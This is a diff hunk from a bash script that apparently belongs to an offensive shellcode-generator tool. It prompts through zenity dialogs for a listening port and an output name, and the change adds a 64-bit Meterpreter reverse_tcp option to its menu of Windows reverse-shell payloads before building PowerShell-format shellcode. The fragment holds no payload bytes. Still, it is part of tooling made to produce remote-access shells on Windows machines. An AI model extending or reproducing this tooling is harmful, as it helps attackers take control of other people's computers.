@@ -1734,8 +1734,7 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --wid
 N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 
 # input payload choise
-paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 200) > /dev/null 2>&1
-
+paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 200) > /dev/null 2>&1
 
 echo "[☠ ] Building shellcode -> powershell format ..."
 sleep 2
